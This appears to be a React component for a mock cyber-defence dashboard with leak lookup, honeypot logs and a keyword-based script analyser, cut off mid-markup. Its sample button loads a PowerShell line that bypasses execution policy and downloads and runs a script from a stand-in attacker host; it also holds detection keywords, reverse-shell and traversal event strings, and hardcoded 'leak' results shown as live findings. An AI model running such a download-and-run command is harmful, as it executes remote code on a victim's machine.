import { useState, useEffect, useMemo, useRef } from 'react';
import { 
  ShieldAlert, ShieldCheck, AlertTriangle, Terminal, Cpu, Key, AlertOctagon, 
  RefreshCw, Radar, Globe, Target, Eye, EyeOff, Radio, Search, Skull, 
  Flame, Zap, Play, CheckCircle2, ChevronRight, Bug, Server, ShieldCheck as ShieldCheckIcon,
  Activity, Heart, ClipboardList, Check
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { diagnoseSystem, DiagnosisResult } from '../services/geminiService';

interface SentryWolfProps {
  language: string;
  theme: 'light' | 'dark';
}

interface DecoyLog {
  id: string;
  timestamp: string;
  decoyType: string;
  attackerIp: string;
  event: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  status: 'monitoring' | 'intercepted' | 'neutralized';
}

const DECOY_TYPES = [
  { id: 'canary_cred', name: 'Canary AWS Credentials', icon: Key, desc: 'Fake access keys deployed to trap automatic cloud crawlers.' },
  { id: 'admin_panel', name: 'Admin Console Portal Decoy', icon: Server, desc: 'A mock administrative login page to attract brute-force attacks.' },
  { id: 'db_trap', name: 'Relational Database Decoy', icon: DatabaseIcon, desc: 'Faux PostgreSQL database listener that isolates SQL-injection scans.' },
  { id: 'oauth_decoy', name: 'Fake Third-Party OAuth Route', icon: Globe, desc: 'Fake authentication callback to capture state-hijacking attempts.' }
];

function DatabaseIcon(props: any) {
  return (
    <svg
      {...props}
      xmlns="http://www.w3.org/2000/svg"
      width="24"
      height="24"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <ellipse cx="12" cy="5" rx="9" ry="3" />
      <path d="M3 5V19A9 3 0 0 0 21 19V5" />
      <path d="M3 12A9 3 0 0 0 21 12" />
    </svg>
  );
}

const ATTACK_IPS = ["185.220.101.4", "45.146.164.120", "193.106.191.13", "91.240.118.23", "82.102.23.45", "109.236.12.8"];
const ATTACK_EVENTS = [
  "SQL injection probe on user endpoint",
  "AWS S3 metadata brute-force scan",
  "Credential stuffing payload transmitted",
  "Directory traversal attempt (/../../etc/passwd)",
  "Automated scanner 'Zgrab/Masscan' detected",
  "Reverse shell socket payload request"
];

export function SentryWolfView({ language, theme }: SentryWolfProps) {
  const isRTL = language === 'Arabic';
  const [activeTab, setActiveTab] = useState<'hunt' | 'decoy' | 'sandbox' | 'doctor'>('hunt');

  // Multi-language dictionary
  const dict: Record<string, Record<string, string>> = {
    title: {
      English: 'Sentry Wolf // Active Cyber Hunter',
      Arabic: 'محطة الذئب السيبراني // الصيد والدفاع النشط'
    },
    subtitle: {
      English: 'Deploy proactive traps, hunt dark web leak indexes, and dissect malicious shellcode payloads in real-time.',
      Arabic: 'انشر فخاخ التمويه، وطارد تسريبات الويب المظلم، وفكك الأكواد البرمجية الخبيثة في الوقت الفعلي.'
    },
    tabHunt: {
      English: 'Dark Web Leak Hunt',
      Arabic: 'مطاردة تسريبات الويب المظلم'
    },
    tabDecoy: {
      English: 'Active Decoy Deployer',
      Arabic: 'فخاخ التمويه النشطة'
    },
    tabSandbox: {
      English: 'AI Exploit Dissector',
      Arabic: 'مفكك الأكواد والمحاكاة'
    },
    tabDoctor: {
      English: 'AI System Doctor 🩺',
      Arabic: 'طبيب النظام الذكي 🩺'
    },
    huntPlaceholder: {
      English: 'Enter email, domain, or phone number...',
      Arabic: 'أدخل البريد، النطاق، أو رقم الهاتف...'
    },
    sandboxPlaceholder: {
      English: 'Paste shellcode, malicious PowerShell, Python script or curl request to dissect...',
      Arabic: 'أدخل أوامر PowerShell، سكريبت بايثون، أو طلب curl مشبوه لتفكيكه وتحليله...'
    },
    huntButton: {
      English: 'Hunt Threats',
      Arabic: 'مطاردة التهديدات'
    },
    hunting: {
      English: 'Crawling Underground Indexes...',
      Arabic: 'جاري مسح قواعد الويب المظلم...'
    },
    doctorTitle: {
      English: 'SentryAI System Doctor // Neural Clinic',
      Arabic: 'طبيب النظام الذكي // العيادة العصبية السيبرانية'
    },
    doctorSubtitle: {
      English: 'Run active clinical diagnostics, analyze system logs, and receive immediate medical security prescriptions.',
      Arabic: 'أجرِ الفحوصات التشخيصية النشطة، وحلل سجلات النظام، واحصل على وصفات طبية علاجية فورية لتأمين بيئتك.'
    },
    runDiagnosis: {
      English: 'Run Neural Diagnostic Scan',
      Arabic: 'إجراء الفحص العصبي التشخيصي'
    },
    diagnosing: {
      English: 'Scanning System Vitals...',
      Arabic: 'جاري فحص النبضات الحيوية للنظام...'
    },
    doctorPlaceholder: {
      English: 'Write or paste a system report, port configuration, or active task parameters to analyze...',
      Arabic: 'اكتب أو الصق تقرير النظام، إعدادات المنافذ، أو معاملات المهام النشطة لتشخيصها...'
    }
  };

  const getTxt = (key: string) => {
    const lang = language === 'Arabic' ? 'Arabic' : 'English';
    return dict[key]?.[lang] || dict[key]?.['English'] || key;
  };

  // --- AI SYSTEM DOCTOR STATE ---
  const [doctorLog, setDoctorLog] = useState('');
  const [selectedPreset, setSelectedPreset] = useState('preset1');
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagnosisResult, setDiagnosisResult] = useState<DiagnosisResult | null>(null);

  const doctorPresets = {
    preset1: {
      label: language === 'Arabic' ? 'عدوى ملفات الارتباط الكوكيز (حرجة)' : 'Compromised Browser Cookies (Critical)',
      text: language === 'Arabic' 
        ? `[تقرير تشخيص النظام]\nالمتصفح: Chrome 124.0.0 (Windows NT 10.0)\nملفات الارتباط النشطة: session_id=scg_11a8f9d0c239_compromised; logged_in=true;\nالحالة: تم رصد إشارات اختراق لملف الكوكيز في مجلد التخزين المحلي للمتصفح.\nالشبكة: خط اتصال مشبوه مفتوح للخارج نحو العنوان IP: 185.220.101.4:443\nالحركة: تسريب بيانات تفويض الوصول نشط في الخلفية.`
        : `[SYSTEM DIAGNOSTIC REPORT]\nUserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0\nCookies: session_id=scg_11a8f9d0c239_compromised; logged_in=true;\nActive Exts: Chrome Developer Helper (Fake Tool), Redline Stealer\nNetwork Socket: Outbound connection open to unverified IP: 185.220.101.4:443\nStatus: High outbound entropy indicating browser data leakage.`
    },
    preset2: {
      label: language === 'Arabic' ? 'نظام مشفر ومحمي بالكامل (سليم)' : 'Fully Encrypted Safe Host (Pristine)',
      text: language === 'Arabic'
        ? `[تقرير تشخيص النظام]\nالبيئة: Sentry Sandbox معزول بالكامل\nالتحقق متعدد العوامل: مفعل ومقيد برموز أمان صلبة FIDO2\nبروتوكولات التشفير: TLS 1.3 معزز بـ AES-256-GCM\nالحالة: جميع مؤشرات النبض سليمة، لا توجد إضافات متصفح مجهولة، حماية الذاكرة مفعلة.\nمستكشف التهديدات: نظيف بالكامل.`
        : `[SYSTEM DIAGNOSTIC REPORT]\nPlatform: Chrome OS Isolated Sandbox\nAuthentication: MFA Enabled via hardware security keys (FIDO2)\nEncryption: End-to-end TLS 1.3 with AES-256-GCM enforced\nLocalStorage: fully cleared and zeroized on session termination\nStatus: Normal heartbeat telemetry. Vulnerability scan returned 0 triggers.`
    },
    preset3: {
      label: language === 'Arabic' ? 'ثغرات المنافذ وجدار الحماية (متوسط)' : 'Open Ports & Firewall Deficit (Medium)',
      text: language === 'Arabic'
        ? `[تقرير تشخيص النظام]\nنظام التشغيل: Ubuntu Server 22.04 LTS\nالمنافذ المفتوحة: 22 (SSH), 80 (HTTP), 5432 (PostgreSQL-unsecured), 9001 (Raw Shell Listener)\nصلاحيات النظام: تشغيل البرامج يتم عبر حساب الجذر (root) مباشرة دون قيود.\nجدار الحماية: غير مفعل (UFW disabled)\nالحالة: محاولات متكررة للتخمين على المنافذ والاتصال بمفسر الأوامر العكسي.`
        : `[SYSTEM DIAGNOSTIC REPORT]\nOperating System: Ubuntu Server 22.04 LTS\nOpen Sockets: Port 22 (SSH), 80 (HTTP), 5432 (Postgres - default password), 9001 (Netcat shell)\nUFW Status: Inactive (firewall completely disabled)\nUser Privileges: Daemon process running directly as root user.\nStatus: Port scanning and remote command execution vector active.`
    }
  };

  useEffect(() => {
    if (activeTab === 'doctor' && !doctorLog) {
      setDoctorLog(doctorPresets.preset1.text);
    }
  }, [activeTab]);

  const handlePresetChange = (presetKey: string) => {
    setSelectedPreset(presetKey);
    setDoctorLog((doctorPresets as any)[presetKey].text);
  };

  const handleSystemDoctorScan = async () => {
    if (!doctorLog.trim()) return;
    setIsDiagnosing(true);
    setDiagnosisResult(null);
    try {
      const res = await diagnoseSystem(doctorLog, language);
      setDiagnosisResult(res);
    } catch (e) {
      console.error(e);
    } finally {
      setIsDiagnosing(false);
    }
  };

  // --- DARK WEB HUNT STATE ---
  const [huntQuery, setHuntQuery] = useState('');
  const [isHunting, setIsHunting] = useState(false);
  const [huntResults, setHuntResults] = useState<any | null>(null);

  const handleHunt = () => {
    if (!huntQuery.trim()) return;
    setIsHunting(true);
    setHuntResults(null);

    setTimeout(() => {
      setIsHunting(false);
      const isEmail = huntQuery.includes('@');
      const isDomain = huntQuery.includes('.') && !isEmail;

      if (isEmail) {
        setHuntResults({
          query: huntQuery,
          threatLevel: 'HIGH',
          score: 84,
          leaks: [
            {
              source: 'Underworld Raid Forums (SQL Leak)',
              date: 'March 2026',
              type: 'Credentials & Passwords',
              exposed: 'Email, SHA-256 Hashed Password, IP Address, Username',
              recommendationEn: 'Immediately change master password and deploy Multi-Factor Authentication (MFA).',
              recommendationAr: 'قم بتغيير كلمة المرور الرئيسية فوراً وفعل نظام التحقق ثنائي العامل (MFA).'
            },
            {
              source: 'Redline Malware Telegram Stealer Channel',
              date: 'December 2025',
              type: 'Browser Session Cookies & Autofill',
              exposed: 'Active session tokens, Credit card autofills, local passwords',
              recommendationEn: 'Clear all browser session cookies, run a deep anti-malware system scan, and revoke active API tokens.',
              recommendationAr: 'امسح ملفات تعريف ارتباط المتصفح بالكامل، وافحص جهازك ببرنامج مكافحة الفيروسات، والغي ترخيص الرموز النشطة.'
            }
          ]
        });
      } else if (isDomain) {
        setHuntResults({
          query: huntQuery,
          threatLevel: 'MEDIUM',
          score: 45,
          leaks: [
            {
              source: 'Compromised Subdomain Directory Index',
              date: 'February 2026',
              type: 'Subdomain Hijacking / DNS Takeover',
              exposed: 'DNS record configurations, mail server routes, active zone transfers',
              recommendationEn: 'Deploy strict DNSSEC policies, restrict AXFR zone transfers, and verify SPF alignment.',
              recommendationAr: 'قم بتفعيل معايير DNSSEC الصارمة، وقيد عمليات نقل النطاقات (AXFR)، وتحقق من إعدادات SPF.'
            }
          ]
        });
      } else {
        setHuntResults({
          query: huntQuery,
          threatLevel: 'CRITICAL',
          score: 95,
          leaks: [
            {
              source: 'Global Mobile Operator Database Dump',
              date: 'January 2026',
              type: 'Smishing Targets & Sim Swap Vector',
              exposed: 'Phone numbers, IMEI codes, physical addresses, full names',
              recommendationEn: 'Contact telecom provider to lock SIM configurations and disable SMS-based password recovery.',
              recommendationAr: 'اتصل بمزود الخدمة لقفل الشريحة (SIM Lock) وإلغاء استرجاع الحسابات عبر رسائل الـ SMS.'
            }
          ]
        });
      }
    }, 3000);
  };

  // --- ACTIVE DECOY (HONEYPOT) STATE ---
  const [activeDecoys, setActiveDecoys] = useState<string[]>(['canary_cred']);
  const [decoyLogs, setDecoyLogs] = useState<DecoyLog[]>([]);
  const [strikeActive, setStrikeActive] = useState(false);
  const logContainerRef = useRef<HTMLDivElement>(null);

  // Generate random attack events
  useEffect(() => {
    const interval = setInterval(() => {
      if (activeDecoys.length === 0) return;
      
      const randomDecoyId = activeDecoys[Math.floor(Math.random() * activeDecoys.length)];
      const decoyInfo = DECOY_TYPES.find(d => d.id === randomDecoyId);
      if (!decoyInfo) return;

      const randomIp = ATTACK_IPS[Math.floor(Math.random() * ATTACK_IPS.length)];
      const randomEvent = ATTACK_EVENTS[Math.floor(Math.random() * ATTACK_EVENTS.length)];
      
      const newLog: DecoyLog = {
        id: crypto.randomUUID(),
        timestamp: new Date().toLocaleTimeString(),
        decoyType: decoyInfo.name,
        attackerIp: randomIp,
        event: randomEvent,
        severity: Math.random() > 0.6 ? 'critical' : Math.random() > 0.4 ? 'high' : 'medium',
        status: 'monitoring'
      };

      setDecoyLogs(prev => [...prev.slice(-30), newLog]);
    }, 4000);

    return () => clearInterval(interval);
  }, [activeDecoys]);

  // Handle active defensive strike
  const triggerDefensiveStrike = () => {
    setStrikeActive(true);
    setDecoyLogs(prev => prev.map(log => ({ ...log, status: 'neutralized' })));
    setTimeout(() => {
      setStrikeActive(false);
    }, 4000);
  };

  const toggleDecoy = (id: string) => {
    setActiveDecoys(prev => 
      prev.includes(id) ? prev.filter(x => x !== id) : [...prev, id]
    );
  };

  // Scroll decoys to bottom
  useEffect(() => {
    if (logContainerRef.current) {
      logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
    }
  }, [decoyLogs]);


  // --- AI EXPLOIT DISSECTOR ---
  const [sandboxCode, setSandboxCode] = useState('');
  const [dissecting, setDissecting] = useState(false);
  const [dissectionResult, setDissectionResult] = useState<any | null>(null);

  const handleDissect = () => {
    if (!sandboxCode.trim()) return;
    setDissecting(true);
    setDissectionResult(null);

    setTimeout(() => {
      setDissecting(false);
      const lower = sandboxCode.toLowerCase();
      
      let threatType = 'Generic Shell Script';
      let threatTypeAr = 'ملف أوامر عام';
      let dangerLevel = 'MEDIUM';
      let score = 55;
      const detections: string[] = [];
      const detectionsAr: string[] = [];

      if (lower.includes('powershell') || lower.includes('iex') || lower.includes('bypass')) {
        threatType = 'Malicious PowerShell Payload';
        threatTypeAr = 'كود PowerShell خبيث خارق للصلاحيات';
        dangerLevel = 'CRITICAL';
        score = 96;
        detections.push('Execution Policy Bypass detected: attempts to bypass host operating system security layers.');
        detections.push('IEX / DownloadString expression spotted: indicates dynamic script execution from remote host.');
        detectionsAr.push('تجاوز سياسة التشغيل: محاولة الالتفاف على جدار الحماية لنظام التشغيل المضيف.');
        detectionsAr.push('أمر تحميل وتشغيل خارجي (IEX): يدل على جلب وتشغيل ملفات خبيثة من خادم بعيد.');
      } else if (lower.includes('os.system') || lower.includes('subprocess') || lower.includes('socket')) {
        threatType = 'Interactive Reverse Shell';
        threatTypeAr = 'اتصال عكسي مخترق للنظام (Reverse Shell)';
        dangerLevel = 'CRITICAL';
        score = 92;
        detections.push('Raw socket binding combined with system invocation: attempts to spawn interactive command shell.');
        detections.push('System command Execution: launches underlying OS shell without safety boundaries.');
        detectionsAr.push('ربط مباشر للمنافذ البرمجية مع تشغيل النظام: يحاول فتح خط اتصال خلفي مع الهداف المخترق.');
        detectionsAr.push('استدعاء أوامر نظام التشغيل: تشغيل موجه الأوامر للمضيف دون قيود أمنية.');
      } else if (lower.includes('cookie') || lower.includes('localStorage') || lower.includes('fetch')) {
        threatType = 'Credential Stealer Script';
        threatTypeAr = 'سكريبت سرقة الكوكيز والبيانات الشخصية';
        dangerLevel = 'HIGH';
        score = 78;
        detections.push('Browser localStorage traversal discovered: attempts to extract active authentication tokens.');
        detections.push('External exfiltration post request: sends collected data to unverified foreign URL.');
        detectionsAr.push('استخراج بيانات المتصفح المحلي: يحاول جمع وقراءة الكوكيز وبيانات الاعتماد النشطة.');
        detectionsAr.push('إرسال خارجي للبيانات (Exfiltration): يقوم بشحن البيانات المسروقة إلى خادم خارجي مجهول.');
      } else {
        detections.push('Suspicious system-level instruction invocation detected in general workspace.');
        detections.push('Generic obfuscation or high entropy strings found.');
        detectionsAr.push('تم العثور على استدعاءات مريبة لتعليمات على مستوى نظام التشغيل.');
        detectionsAr.push('وجود نصوص مبهمة أو تشفير عالي الكثافة.');
      }

      setDissectionResult({
        threatType,
        threatTypeAr,
        dangerLevel,
        score,
        detections,
        detectionsAr,
        mitreMatrix: [
          { tactic: 'Initial Access', technique: 'T1566 Phishing', status: 'verified' },
          { tactic: 'Execution', technique: 'T1059 Command Scripting Interpreter', status: 'verified' },
          { tactic: 'Defense Evasion', technique: 'T1562 Impair Defenses', status: 'flagged' },
          { tactic: 'Exfiltration', technique: 'T1041 Exfiltration Over C2 Channel', status: 'flagged' }
        ]
      });
    }, 2500);
  };


  return (
    <div className={`p-8 rounded-3xl border ${theme === 'dark' ? 'bg-[#0B0D0F] border-white/5' : 'bg-white border-slate-200'} shadow-2xl space-y-8`}>
      {/* Header section with brand tagline */}
      <div className={`flex flex-col md:flex-row md:items-center justify-between gap-4 border-b pb-6 ${theme === 'dark' ? 'border-white/5' : 'border-slate-100'} ${isRTL ? 'md:flex-row-reverse' : ''}`}>
        <div className="space-y-1">
          <div className={`flex items-center gap-3 ${isRTL ? 'flex-row-reverse' : ''}`}>
            <Skull className="w-7 h-7 text-red-500 animate-pulse" />
            <h2 className={`text-2xl font-black uppercase tracking-tight ${theme === 'dark' ? 'text-white' : 'text-slate-900'}`}>
              {getTxt('title')}
            </h2>
            <span className="bg-red-500/10 border border-red-500/20 text-red-500 text-[9px] font-black tracking-widest px-2 py-0.5 rounded">WOLF ACTIVE</span>
          </div>
          <p className={`text-xs ${theme === 'dark' ? 'text-white/40' : 'text-slate-400'}`}>
            {getTxt('subtitle')}
          </p>
        </div>

        {/* Dynamic subtabs */}
        <div className="flex bg-white/5 p-1 rounded-xl border border-white/5 self-start">
          <button
            onClick={() => setActiveTab('hunt')}
            className={`px-4 py-2 rounded-lg text-xs font-bold transition-all ${
              activeTab === 'hunt' 
                ? 'bg-red-500 text-white shadow-lg font-black' 
                : 'text-white/60 hover:text-white'
            }`}
          >
            {getTxt('tabHunt')}
          </button>
          <button
            onClick={() => setActiveTab('decoy')}
            className={`px-4 py-2 rounded-lg text-xs font-bold transition-all ${
              activeTab === 'decoy' 
                ? 'bg-red-500 text-white shadow-lg font-black' 
                : 'text-white/60 hover:text-white'
            }`}
          >
            {getTxt('tabDecoy')}
          </button>
          <button
            onClick={() => setActiveTab('sandbox')}
            className={`px-4 py-2 rounded-lg text-xs font-bold transition-all ${
              activeTab === 'sandbox' 
                ? 'bg-red-500 text-white shadow-lg font-black' 
                : 'text-white/60 hover:text-white'
            }`}
          >
            {getTxt('tabSandbox')}
          </button>
          <button
            onClick={() => setActiveTab('doctor')}
            className={`px-4 py-2 rounded-lg text-xs font-bold transition-all ${
              activeTab === 'doctor' 
                ? 'bg-red-500 text-white shadow-lg font-black' 
                : 'text-white/60 hover:text-white'
            }`}
          >
            {getTxt('tabDoctor')}
          </button>
        </div>
      </div>

      <AnimatePresence mode="wait">
        {/* TAB 1: DARK WEB HUNT */}
        {activeTab === 'hunt' && (
          <motion.div
            key="hunt"
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -15 }}
            className="space-y-6"
          >
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
              {/* Query Panel */}
              <div className="lg:col-span-6 space-y-4">
                <div className="relative group">
                  <input
                    type="text"
                    value={huntQuery}
                    onChange={(e) => setHuntQuery(e.target.value)}
                    placeholder={getTxt('huntPlaceholder')}
                    className={`w-full p-4 rounded-xl border-2 font-mono text-sm ${
                      theme === 'dark' 
                        ? 'bg-[#0E1012] border-white/10 text-red-500 focus:border-red-500' 
                        : 'bg-slate-50 border-slate-200 text-slate-800 focus:border-red-500'
                    } focus:outline-none`}
                  />
                </div>
                <button
                  onClick={handleHunt}
                  disabled={!huntQuery.trim() || isHunting}
                  className="px-6 py-3.5 bg-red-600 hover:bg-red-500 disabled:bg-slate-200 disabled:text-slate-400 text-white rounded-xl text-xs font-black uppercase tracking-widest transition-all shadow-md active:scale-95 flex items-center gap-2"
                >
                  {isHunting ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      {getTxt('hunting')}
                    </>
                  ) : (
                    <>
                      <Radar className="w-4 h-4 animate-pulse" />
                      {getTxt('huntButton')}
                    </>
                  )}
                </button>

                {/* Radar visualization */}
                <div className={`relative h-64 border rounded-2xl flex items-center justify-center overflow-hidden ${
                  theme === 'dark' ? 'bg-[#050607]/90 border-white/5' : 'bg-slate-900 border-slate-800'
                }`}>
                  <div className="absolute inset-0 bg-[radial-gradient(circle,rgba(239,68,68,0.05)_0%,transparent_70%)] animate-pulse" />
                  <div className="w-48 h-48 rounded-full border-2 border-red-500/20 flex items-center justify-center animate-spin duration-[6000ms]">
                    <div className="w-32 h-32 rounded-full border border-red-500/30 flex items-center justify-center">
                      <div className="w-16 h-16 rounded-full border border-red-500/40 flex items-center justify-center">
                        <div className="w-2 h-2 rounded-full bg-red-500 animate-ping" />
                      </div>
                    </div>
                  </div>
                  {/* Radar Sweeper Line */}
                  <div className="absolute top-1/2 left-1/2 w-24 h-[1px] bg-red-500 origin-left animate-spin" style={{ animationDuration: '3s' }} />
                  
                  {/* Blips */}
                  <span className="absolute top-12 left-16 w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
                  <span className="absolute bottom-16 right-20 w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" style={{ animationDelay: '1.2s' }} />
                  <span className="absolute top-20 right-12 w-2 h-2 rounded-full bg-red-500 animate-pulse" style={{ animationDelay: '0.6s' }} />
                  
                  <span className="absolute bottom-4 left-6 font-mono text-[9px] text-red-500/50 uppercase tracking-widest">
                    Active Stealer Feeds: Connected // 281 Nodes
                  </span>
                </div>
              </div>

              {/* Hunt Results Display */}
              <div className="lg:col-span-6">
                <AnimatePresence mode="wait">
                  {huntResults ? (
                    <motion.div
                      key="results"
                      initial={{ opacity: 0, scale: 0.98 }}
                      animate={{ opacity: 1, scale: 1 }}
                      className={`p-6 rounded-2xl border ${
                        theme === 'dark' ? 'bg-[#0E1012] border-white/5' : 'bg-slate-50 border-slate-200'
                      } space-y-6`}
                    >
                      <div className="flex items-center justify-between border-b pb-4 border-white/5">
                        <div>
                          <span className="text-[10px] font-mono text-white/30 uppercase tracking-widest block">Hunt Query Target</span>
                          <span className="text-sm font-mono text-red-400 font-bold break-all">{huntResults.query}</span>
                        </div>
                        <span className="bg-red-500/15 text-red-500 border border-red-500/30 px-3 py-1 rounded text-[10px] font-mono font-black uppercase tracking-widest">
                          {huntResults.threatLevel} RISK
                        </span>
                      </div>

                      <div className="space-y-4 max-h-96 overflow-y-auto pr-1">
                        {huntResults.leaks.map((leak: any, idx: number) => (
                          <div key={idx} className="bg-black/20 border border-white/5 p-4 rounded-xl space-y-3">
                            <div className="flex items-center gap-2 justify-between">
                              <span className="text-xs text-white/80 font-black tracking-wide uppercase">{leak.source}</span>
                              <span className="text-[9px] bg-white/5 text-white/40 px-2 py-0.5 rounded uppercase">{leak.date}</span>
                            </div>
                            <div className="grid grid-cols-2 gap-2 text-[10px]">
                              <div>
                                <span className="text-white/30 block">Leak Type</span>
                                <span className="text-white/70 font-semibold">{leak.type}</span>
                              </div>
                              <div>
                                <span className="text-white/30 block">Exposed Datatypes</span>
                                <span className="text-red-400 font-mono">{leak.exposed}</span>
                              </div>
                            </div>
                            <div className="border-t border-white/5 pt-2 space-y-1">
                              <span className="text-[10px] uppercase font-bold text-red-500/50 tracking-widest block">Wolf Remediation Directive</span>
                              <p className="text-xs text-red-300 font-medium leading-relaxed">
                                {isRTL ? leak.recommendationAr : leak.recommendationEn}
                              </p>
                            </div>
                          </div>
                        ))}
                      </div>
                    </motion.div>
                  ) : (
                    <div className={`h-full flex flex-col items-center justify-center text-center p-12 border border-dashed rounded-2xl ${
                      theme === 'dark' ? 'border-white/5 text-white/15 bg-white/[0.01]' : 'border-slate-200 text-slate-400 bg-slate-50'
                    }`}>
                      <Search className="w-12 h-12 mb-3 text-red-500/30 animate-pulse" />
                      <p className="text-xs font-mono uppercase tracking-widest">Awaiting active cyber sweep trigger...</p>
                    </div>
                  )}
                </AnimatePresence>
              </div>
            </div>
          </motion.div>
        )}

        {/* TAB 2: ACTIVE DECOY (HONEYPOT) */}
        {activeTab === 'decoy' && (
          <motion.div
            key="decoy"
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -15 }}
            className="space-y-8"
          >
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
              {/* Left Selector Controls */}
              <div className="lg:col-span-5 space-y-4">
                <span className="text-[10px] font-mono text-white/40 uppercase tracking-widest block">Select Active Honeypots</span>
                
                <div className="space-y-3">
                  {DECOY_TYPES.map(decoy => {
                    const Icon = decoy.icon;
                    const isDeployed = activeDecoys.includes(decoy.id);
                    return (
                      <button
                        key={decoy.id}
                        onClick={() => toggleDecoy(decoy.id)}
                        className={`w-full p-4 rounded-xl border-2 text-left transition-all flex items-start gap-4 ${
                          isDeployed
                            ? 'bg-red-500/10 border-red-500 text-red-400'
                            : `${theme === 'dark' ? 'bg-[#0E1012] border-white/10 text-white/50 hover:border-white/20' : 'bg-slate-50 border-slate-200 text-slate-700 hover:border-slate-300'}`
                        }`}
                      >
                        <div className={`p-2 rounded-lg border ${isDeployed ? 'bg-red-500/20 border-red-500/30' : 'bg-white/5 border-white/5'}`}>
                          <Icon className="w-4 h-4 text-red-500" />
                        </div>
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <span className="text-xs font-black uppercase tracking-wider">{decoy.name}</span>
                            {isDeployed && (
                              <span className="bg-red-500 text-white font-mono text-[8px] px-1.5 py-0.5 rounded font-bold uppercase tracking-widest animate-pulse">DEPLOYED</span>
                            )}
                          </div>
                          <p className="text-[10px] text-white/40 leading-relaxed">{decoy.desc}</p>
                        </div>
                      </button>
                    );
                  })}
                </div>

                <button
                  onClick={triggerDefensiveStrike}
                  disabled={decoyLogs.length === 0 || strikeActive}
                  className={`w-full py-4 rounded-xl text-xs font-black uppercase tracking-widest transition-all ${
                    strikeActive 
                      ? 'bg-red-600 text-white' 
                      : 'bg-red-500 hover:bg-red-400 text-white shadow-lg'
                  }`}
                >
                  {strikeActive ? 'UNLEASHING DECOY STRIKE...' : 'ACTIVATE WOLF FIREWALL STRIKE'}
                </button>
              </div>

              {/* Right Real-time CLI Logs */}
              <div className="lg:col-span-7 flex flex-col justify-between p-6 rounded-2xl border bg-[#050607] border-white/5 font-mono h-[420px]">
                <div className="flex items-center justify-between border-b border-white/5 pb-3">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-red-500 animate-pulse" />
                    <span className="text-[10px] text-white/40 uppercase tracking-widest">Active Decoy Monitor Stream</span>
                  </div>
                  <span className="text-[9px] text-red-500/60 uppercase tracking-widest">Live Listening // Port 3000-8080</span>
                </div>

                <div 
                  ref={logContainerRef}
                  className="flex-1 overflow-y-auto my-4 space-y-2.5 text-[11px] leading-relaxed pr-1"
                >
                  {decoyLogs.length === 0 ? (
                    <div className="text-white/20 h-full flex items-center justify-center text-center">
                      <p className="italic">Awaiting automated network scanner probes...</p>
                    </div>
                  ) : (
                    decoyLogs.map(log => (
                      <div key={log.id} className="flex items-start gap-2 border-b border-white/[0.02] pb-2">
                        <span className="text-white/30">[{log.timestamp}]</span>
                        <div className="flex-1 space-y-1">
                          <div className="flex items-center justify-between">
                            <span className="text-red-400 font-bold">{log.decoyType}</span>
                            <span className={`text-[9px] px-1.5 rounded font-bold uppercase tracking-widest ${
                              log.status === 'neutralized'
                                ? 'bg-emerald-500/15 text-emerald-400'
                                : 'bg-red-500/10 text-red-500'
                            }`}>
                              {log.status === 'neutralized' ? '✓ Strike Shield' : '⚠️ Scan ping'}
                            </span>
                          </div>
                          <div className="text-white/60">
                            Attacker: <span className="text-red-300 font-bold">{log.attackerIp}</span> // {log.event}
                          </div>
                        </div>
                      </div>
                    ))
                  )}
                </div>

                <div className="border-t border-white/5 pt-3 flex items-center justify-between text-[10px] text-white/30">
                  <span>Honeypots Active: {activeDecoys.length} / 4</span>
                  <span>Containment Engine: Active & Protected</span>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {/* TAB 3: AI EXPLOIT DISSECTOR */}
        {activeTab === 'sandbox' && (
          <motion.div
            key="sandbox"
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -15 }}
            className="space-y-6"
          >
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
              {/* Left Source Code Paste */}
              <div className="lg:col-span-6 space-y-4">
                <textarea
                  value={sandboxCode}
                  onChange={(e) => setSandboxCode(e.target.value)}
                  placeholder={getTxt('sandboxPlaceholder')}
                  className={`w-full h-80 p-6 rounded-2xl border-2 font-mono text-xs leading-relaxed ${
                    theme === 'dark' 
                      ? 'bg-[#0E1012] border-white/10 text-red-500 focus:border-red-500' 
                      : 'bg-slate-50 border-slate-200 text-slate-800 focus:border-red-500'
                  } focus:outline-none resize-none shadow-inner`}
                />
                
                <div className="flex gap-4">
                  <button
                    onClick={handleDissect}
                    disabled={!sandboxCode.trim() || dissecting}
                    className="px-6 py-3.5 bg-red-600 hover:bg-red-500 disabled:bg-slate-200 disabled:text-slate-400 text-white rounded-xl text-xs font-black uppercase tracking-widest transition-all shadow-md active:scale-95 flex items-center gap-2"
                  >
                    {dissecting ? (
                      <>
                        <RefreshCw className="w-4 h-4 animate-spin" />
                        Dissecting Code...
                      </>
                    ) : (
                      <>
                        <Bug className="w-4 h-4" />
                        Execute Exploit Audit
                      </>
                    )}
                  </button>
                  <button
                    onClick={() => {
                      setSandboxCode(`powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex(New-Object Net.WebClient).DownloadString('http://evil-cyber-server.com/payload.ps1')"\n# Simulated bypass exploit block`);
                    }}
                    className={`px-4 py-3.5 rounded-xl border text-[10px] font-mono uppercase tracking-widest transition-all ${
                      theme === 'dark' ? 'bg-white/5 border-white/5 text-white/50 hover:bg-white/10' : 'bg-slate-100 border-slate-200 text-slate-600 hover:bg-slate-200'
                    }`}
                  >
                    Load Sample Script
                  </button>
